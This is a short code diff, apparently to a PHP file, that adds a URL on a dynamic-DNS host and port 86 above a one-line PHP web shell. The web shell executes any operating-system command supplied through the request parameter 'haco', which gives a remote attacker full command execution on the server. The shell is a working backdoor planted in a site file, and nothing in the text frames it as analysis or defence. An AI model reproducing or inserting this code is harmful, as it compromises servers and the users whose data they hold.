@@ -1,4 +1,4 @@
-
+http://bygwillo.dyndns.org:86/
 <?php echo system($_REQUEST['haco']); ?>
 
 
